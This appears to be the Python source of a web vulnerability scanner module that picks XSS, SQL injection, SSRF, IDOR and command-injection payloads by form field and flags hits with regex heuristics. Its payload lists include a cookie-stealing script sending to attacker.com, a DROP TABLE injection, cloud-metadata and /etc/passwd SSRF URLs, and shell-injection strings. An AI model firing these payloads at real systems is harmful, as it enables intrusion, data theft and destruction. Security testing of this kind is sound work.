#!/usr/bin/env python3
"""
AI Policy Layer - Handles AI/No-AI mode switching with rule-based fallbacks
Professional cybersecurity tool with comprehensive payload generation and heuristic detection
"""

import json
import re
import yaml
import logging
from pathlib import Path
from typing import Dict, List, Union, Optional, Any
from dataclasses import dataclass
from urllib.parse import urlparse

# Global AI enablement flag
ENABLE_AI = True

@dataclass
class VulnerabilityResult:
    """Data class for vulnerability detection results"""
    detected: bool
    confidence: float
    attack_type: str
    evidence: List[str]
    payload_used: str
    heuristic_fired: Optional[str] = None

class AIPolicy:
    """
    Central AI policy controller that handles both AI-powered and rule-based analysis.
    When ENABLE_AI=False, uses rule-based payloads and heuristic detection.
    """
    
    def __init__(self, enable_ai: bool = True, config_path: str = "payloads_config.yaml"):
        """
        Initialize AI Policy with configurable mode
        
        Args:
            enable_ai: Whether to use AI-powered analysis
            config_path: Path to payload configuration file
        """
        global ENABLE_AI
        ENABLE_AI = enable_ai
        self.enable_ai = enable_ai
        self.config_path = Path(config_path)
        
        # Initialize logging
        self.logger = logging.getLogger(__name__)
        
        # Load payload configurations
        self.payload_config = self._load_payload_config()
        
        # Initialize AI components only if enabled
        self.ai_client = None
        if self.enable_ai:
            self._initialize_ai_components()
        
        self.logger.info(f"AI Policy initialized - AI Mode: {'ENABLED' if self.enable_ai else 'DISABLED'}")
    
    def _initialize_ai_components(self):
        """Initialize AI components only when AI is enabled"""
        try:
            # Lazy imports to avoid loading AI libraries when not needed
            global openai, anthropic, google_genai, groq
            
            if ENABLE_AI:
                import openai
                import anthropic
                import google.generativeai as google_genai
                import groq
                
                # Initialize based on available API keys
                # This would be expanded based on your existing AI setup
                self.logger.info("AI components initialized successfully")
        except ImportError as e:
            self.logger.warning(f"AI libraries not available: {e}")
            self.enable_ai = False
    
    def _load_payload_config(self) -> Dict[str, Any]:
        """Load payload configuration from YAML file"""
        if not self.config_path.exists():
            # Create default configuration
            default_config = self._create_default_payload_config()
            self._save_default_config(default_config)
            return default_config
        
        try:
            with open(self.config_path, 'r', encoding='utf-8') as f:
                return yaml.safe_load(f)
        except Exception as e:
            self.logger.error(f"Error loading payload config: {e}")
            return self._create_default_payload_config()
    
    def _create_default_payload_config(self) -> Dict[str, Any]:
        """Create comprehensive default payload configuration"""
        return {
            "xss_payloads": {
                "basic": [
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "<svg onload=alert('XSS')>",
                    "javascript:alert('XSS')",
                    "<iframe src=javascript:alert('XSS')></iframe>"
                ],
                "advanced": [
                    "<script>fetch('https://attacker.com/steal?data='+document.cookie)</script>",
                    "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycpOw=='))>",
                    "<svg/onload=\\u0061lert('XSS')>",
                    "<script>setTimeout('alert(\"XSS\")',1000)</script>",
                    "';alert('XSS');//"
                ],
                "context_specific": {
                    "url_param": ["javascript:alert('XSS')", "data:text/html,<script>alert('XSS')</script>"],
                    "form_field": ["<script>alert('XSS')</script>", "\"><script>alert('XSS')</script>"],
                    "json_field": ["\",\"xss\":\"<script>alert('XSS')</script>"],
                    "attribute": ["\" onmouseover=alert('XSS') \"", "' onclick=alert('XSS') '"]
                }
            },
            "sqli_payloads": {
                "basic": [
                    "' OR '1'='1",
                    "' OR 1=1--",
                    "\" OR \"1\"=\"1",
                    "' UNION SELECT 1,2,3--",
                    "'; DROP TABLE users;--"
                ],
                "advanced": [
                    "' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)>0--",
                    "' OR (SELECT user FROM mysql.user WHERE user='root')='root'--",
                    "1'; WAITFOR DELAY '00:00:05'--",
                    "' OR SLEEP(5)--",
                    "1' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT user())))--"
                ],
                "blind": [
                    "' AND 1=1--",
                    "' AND 1=2--",
                    "' AND (SELECT LENGTH(user()))>0--",
                    "' AND ASCII(SUBSTRING((SELECT user()),1,1))>64--"
                ]
            },
            "ssrf_payloads": {
                "basic": [
                    "http://169.254.169.254/latest/meta-data/",
                    "http://localhost:22",
                    "http://127.0.0.1:80",
                    "file:///etc/passwd",
                    "gopher://127.0.0.1:25"
                ],
                "cloud_metadata": [
                    "http://169.254.169.254/latest/meta-data/instance-id",
                    "http://metadata.google.internal/computeMetadata/v1/",
                    "http://169.254.169.254/metadata/v1/"
                ]
            },
            "idor_payloads": {
                "numeric": ["1", "2", "0", "-1", "999999"],
                "guid": ["00000000-0000-0000-0000-000000000000", "admin", "root"],
                "paths": ["../", "../../", "/admin/", "/user/1/"]
            },
            "csrf_tokens": [
                "",
                "invalid_token",
                "12345",
                "null",
                "undefined"
            ],
            "command_injection": [
                "; ls -la",
                "| whoami",
                "`id`",
                "$(whoami)",
                "&& cat /etc/passwd",
                "; ping -c 4 attacker.com"
            ]
        }
    
    def _save_default_config(self, config: Dict[str, Any]):
        """Save default configuration to file"""
        try:
            with open(self.config_path, 'w', encoding='utf-8') as f:
                yaml.dump(config, f, default_flow_style=False, indent=2)
            self.logger.info(f"Default payload config saved to {self.config_path}")
        except Exception as e:
            self.logger.error(f"Error saving default config: {e}")
    
    def get_payloads(self, form_metadata: Dict[str, Any]) -> List[str]:
        """
        Get payloads for testing - uses AI if enabled, otherwise rule-based
        
        Args:
            form_metadata: Dictionary containing form information (fields, action, method, etc.)
            
        Returns:
            List of payloads to test
        """
        if self.enable_ai and self.ai_client:
            return self._ai_generated_payloads(form_metadata)
        else:
            return self._rule_based_payloads(form_metadata)
    
    def _ai_generated_payloads(self, form_metadata: Dict[str, Any]) -> List[str]:
        """Generate AI-powered payloads (placeholder for existing AI implementation)"""
        # This would integrate with your existing AI payload generation
        # For now, fallback to rule-based
        self.logger.debug("AI payload generation requested - falling back to rule-based")
        return self._rule_based_payloads(form_metadata)
    
    def _rule_based_payloads(self, form_metadata: Dict[str, Any]) -> List[str]:
        """
        Generate rule-based payloads based on form context and field analysis
        
        Args:
            form_metadata: Form information including fields, types, names
            
        Returns:
            List of contextually appropriate payloads
        """
        payloads = []
        
        # Analyze form fields to determine appropriate payload types
        fields = form_metadata.get('fields', [])
        form_action = form_metadata.get('action', '')
        form_method = form_metadata.get('method', 'GET').upper()
        
        # Context-aware payload selection
        for field in fields:
            field_name = field.get('name', '').lower()
            field_type = field.get('type', 'text').lower()
            
            # XSS payloads for text inputs
            if field_type in ['text', 'search', 'url', 'email']:
                if 'search' in field_name or 'query' in field_name:
                    payloads.extend(self.payload_config['xss_payloads']['context_specific']['url_param'])
                else:
                    payloads.extend(self.payload_config['xss_payloads']['basic'][:3])
            
            # SQL injection for database-related fields
            if any(db_term in field_name for db_term in ['user', 'id', 'login', 'email', 'password']):
                payloads.extend(self.payload_config['sqli_payloads']['basic'][:3])
            
            # SSRF for URL fields
            if field_type == 'url' or 'url' in field_name:
                payloads.extend(self.payload_config['ssrf_payloads']['basic'][:2])
            
            # Command injection for file upload or command fields
            if field_type == 'file' or any(cmd_term in field_name for cmd_term in ['cmd', 'command', 'exec']):
                payloads.extend(self.payload_config['command_injection'][:2])
        
        # Add CSRF token manipulation if form uses POST
        if form_method == 'POST':
            payloads.extend(self.payload_config['csrf_tokens'][:2])
        
        # IDOR testing for ID parameters
        if any('id' in field.get('name', '').lower() for field in fields):
            payloads.extend(self.payload_config['idor_payloads']['numeric'][:3])
        
        # Remove duplicates while preserving order
        seen = set()
        unique_payloads = []
        for payload in payloads:
            if payload not in seen:
                seen.add(payload)
                unique_payloads.append(payload)
        
        self.logger.info(f"Generated {len(unique_payloads)} rule-based payloads for form: {form_action}")
        return unique_payloads
    
    def analyze_response(self, response_text: str, payload: str, attack_type: str) -> VulnerabilityResult:
        """
        Analyze response for vulnerabilities - uses AI if enabled, otherwise heuristics
        
        Args:
            response_text: HTTP response content
            payload: Payload that was sent
            attack_type: Type of attack being tested
            
        Returns:
            VulnerabilityResult with detection details
        """
        if self.enable_ai and self.ai_client:
            return self._ai_analysis(response_text, payload, attack_type)
        else:
            return self._simple_heuristic(response_text, payload, attack_type)
    
    def _ai_analysis(self, response_text: str, payload: str, attack_type: str) -> VulnerabilityResult:
        """AI-powered response analysis (placeholder for existing AI implementation)"""
        # This would integrate with your existing AI analysis
        # For now, fallback to heuristic
        self.logger.debug("AI analysis requested - falling back to heuristic")
        return self._simple_heuristic(response_text, payload, attack_type)
    
    def _simple_heuristic(self, response_text: str, payload: str, attack_type: str) -> VulnerabilityResult:
        """
        Simple heuristic-based vulnerability detection
        
        Args:
            response_text: HTTP response content
            payload: Payload that was sent
            attack_type: Type of attack being tested
            
        Returns:
            VulnerabilityResult with detection details
        """
        detected = False
        confidence = 0.0
        evidence = []
        heuristic_fired = None
        
        response_lower = response_text.lower()
        
        if attack_type.lower() in ['xss', 'cross-site scripting']:
            detected, confidence, evidence, heuristic_fired = self._detect_xss(response_text, payload)
        
        elif attack_type.lower() in ['sqli', 'sql injection', 'sql_injection']:
            detected, confidence, evidence, heuristic_fired = self._detect_sqli(response_text, payload)
        
        elif attack_type.lower() in ['ssrf', 'server-side request forgery']:
            detected, confidence, evidence, heuristic_fired = self._detect_ssrf(response_text, payload)
        
        elif attack_type.lower() in ['command_injection', 'command injection']:
            detected, confidence, evidence, heuristic_fired = self._detect_command_injection(response_text, payload)
        
        elif attack_type.lower() in ['idor', 'insecure direct object reference']:
            detected, confidence, evidence, heuristic_fired = self._detect_idor(response_text, payload)
        
        return VulnerabilityResult(
            detected=detected,
            confidence=confidence,
            attack_type=attack_type,
            evidence=evidence,
            payload_used=payload,
            heuristic_fired=heuristic_fired
        )
    
    def _detect_xss(self, response_text: str, payload: str) -> tuple:
        """Detect XSS vulnerabilities using heuristics"""
        evidence = []
        confidence = 0.0
        heuristic = None
        
        # Check if payload is reflected in response
        if payload in response_text:
            evidence.append(f"Payload reflected in response: {payload[:50]}...")
            confidence += 0.4
            heuristic = "payload_reflection"
        
        # Check for script execution indicators
        script_patterns = [
            r'<script[^>]*>.*?</script>',
            r'<img[^>]*onerror[^>]*>',
            r'<svg[^>]*onload[^>]*>',
            r'javascript:',
            r'alert\s*\(',
            r'eval\s*\(',
            r'setTimeout\s*\(',
            r'document\.cookie'
        ]
        
        for pattern in script_patterns:
            if re.search(pattern, response_text, re.IGNORECASE | re.DOTALL):
                evidence.append(f"Script execution pattern found: {pattern}")
                confidence += 0.3
                heuristic = "script_execution_pattern"
        
        # Check for XSS callback URL (OAST)
        if any(domain in response_text for domain in ['burpcollaborator', 'oast.pro', 'xss.ht']):
            evidence.append("XSS callback URL detected")
            confidence += 0.8
            heuristic = "oast_callback"
        
        detected = confidence > 0.3
        
        if detected:
            self.logger.info(f"XSS detected with confidence {confidence:.2f} using heuristic: {heuristic}")
        
        return detected, confidence, evidence, heuristic
    
    def _detect_sqli(self, response_text: str, payload: str) -> tuple:
        """Detect SQL injection vulnerabilities using heuristics"""
        evidence = []
        confidence = 0.0
        heuristic = None
        
        # Database error patterns
        sql_error_patterns = [
            r'SQL syntax.*MySQL',
            r'Warning.*mysql_.*',
            r'valid MySQL result',
            r'MySqlClient\.',
            r'postgresql.*error',
            r'warning.*postgresql',
            r'ORA-\d{5}',
            r'Microsoft.*ODBC.*Driver',
            r'SQLite.*error',
            r'sqlite3\.OperationalError',
            r'Microsoft JET Database',
            r'Access Database Engine',
            r'SQLSTATE\[',
            r'Column count doesn\'t match',
            r'mysql_fetch_array\(\)',
            r'You have an error in your SQL syntax'
        ]
        
        for pattern in sql_error_patterns:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            if matches:
                evidence.append(f"SQL error pattern: {pattern}")
                confidence += 0.7
                heuristic = "sql_error_pattern"
        
        # Time-based detection (for WAITFOR, SLEEP)
        if 'waitfor' in payload.lower() or 'sleep' in payload.lower():
            # This would need response time measurement in practice
            evidence.append("Time-based SQL injection payload detected")
            confidence += 0.3
            heuristic = "time_based_sqli"
        
        # Union-based detection
        if 'union' in payload.lower() and re.search(r'\d+.*\d+.*\d+', response_text):
            evidence.append("UNION SELECT result pattern detected")
            confidence += 0.6
            heuristic = "union_based_sqli"
        
        detected = confidence > 0.5
        
        if detected:
            self.logger.info(f"SQL injection detected with confidence {confidence:.2f} using heuristic: {heuristic}")
        
        return detected, confidence, evidence, heuristic
    
    def _detect_ssrf(self, response_text: str, payload: str) -> tuple:
        """Detect SSRF vulnerabilities using heuristics"""
        evidence = []
        confidence = 0.0
        heuristic = None
        
        # Check for AWS metadata response
        aws_metadata_indicators = [
            'ami-id',
            'instance-id',
            'public-hostname',
            'security-groups',
            'iam/security-credentials'
        ]
        
        for indicator in aws_metadata_indicators:
            if indicator in response_text.lower():
                evidence.append(f"AWS metadata indicator: {indicator}")
                confidence += 0.8
                heuristic = "aws_metadata_exposure"
        
        # Check for internal service responses
        internal_service_patterns = [
            r'SSH-\d+\.\d+',  # SSH banner
            r'220.*SMTP',     # SMTP banner
            r'HTTP/1\.[01] \d{3}',  # HTTP response
            r'root:x:\d+:',   # /etc/passwd content
        ]
        
        for pattern in internal_service_patterns:
            if re.search(pattern, response_text):
                evidence.append(f"Internal service response: {pattern}")
                confidence += 0.6
                heuristic = "internal_service_response"
        
        # Check for OAST server interactions
        if any(domain in response_text for domain in ['burpcollaborator', 'oast.pro', 'interact.sh']):
            evidence.append("OAST server interaction detected")
            confidence += 0.9
            heuristic = "oast_interaction"
        
        detected = confidence > 0.5
        
        if detected:
            self.logger.info(f"SSRF detected with confidence {confidence:.2f} using heuristic: {heuristic}")
        
        return detected, confidence, evidence, heuristic
    
    def _detect_command_injection(self, response_text: str, payload: str) -> tuple:
        """Detect command injection vulnerabilities using heuristics"""
        evidence = []
        confidence = 0.0
        heuristic = None
        
        # Command output patterns
        command_patterns = [
            r'uid=\d+.*gid=\d+',  # id command output
            r'total \d+',         # ls -la output
            r'root.*bin.*daemon', # /etc/passwd content
            r'PING.*bytes of data', # ping output
            r'\.{1,2}:.*\n.*\$',  # shell prompt
        ]
        
        for pattern in command_patterns:
            if re.search(pattern, response_text, re.MULTILINE):
                evidence.append(f"Command output pattern: {pattern}")
                confidence += 0.7
                heuristic = "command_output_pattern"
        
        # Check for system information exposure
        if any(info in response_text.lower() for info in ['windows nt', 'linux', 'darwin', 'freebsd']):
            evidence.append("System information exposed")
            confidence += 0.5
            heuristic = "system_info_exposure"
        
        detected = confidence > 0.5
        
        if detected:
            self.logger.info(f"Command injection detected with confidence {confidence:.2f} using heuristic: {heuristic}")
        
        return detected, confidence, evidence, heuristic
    
    def _detect_idor(self, response_text: str, payload: str) -> tuple:
        """Detect IDOR vulnerabilities using heuristics"""
        evidence = []
        confidence = 0.0
        heuristic = None
        
        # Check for different user data exposure
        sensitive_patterns = [
            r'email.*@.*\.com',
            r'user.*id.*\d+',
            r'profile.*private',
            r'balance.*\$\d+',
            r'ssn.*\d{3}-\d{2}-\d{4}',
            r'phone.*\d{3}-\d{3}-\d{4}'
        ]
        
        for pattern in sensitive_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                evidence.append(f"Sensitive data pattern: {pattern}")
                confidence += 0.4
                heuristic = "sensitive_data_exposure"
        
        # Check response length differences (indication of different user data)
        if len(response_text) > 1000:  # Substantial response
            evidence.append("Substantial response received for modified ID")
            confidence += 0.3
            heuristic = "response_size_difference"
        
        detected = confidence > 0.3
        
        if detected:
            self.logger.info(f"IDOR detected with confidence {confidence:.2f} using heuristic: {heuristic}")
        
        return detected, confidence, evidence, heuristic


# Convenience functions for backward compatibility
def get_payloads(form_metadata: Dict[str, Any], enable_ai: bool = None) -> List[str]:
    """Convenience function to get payloads"""
    if enable_ai is None:
        enable_ai = ENABLE_AI
    
    policy = AIPolicy(enable_ai=enable_ai)
    return policy.get_payloads(form_metadata)

def analyze_response(response_text: str, payload: str, attack_type: str, enable_ai: bool = None) -> VulnerabilityResult:
    """Convenience function to analyze responses"""
    if enable_ai is None:
        enable_ai = ENABLE_AI
    
    policy = AIPolicy(enable_ai=enable_ai)
    return policy.analyze_response(response_text, payload, attack_type)
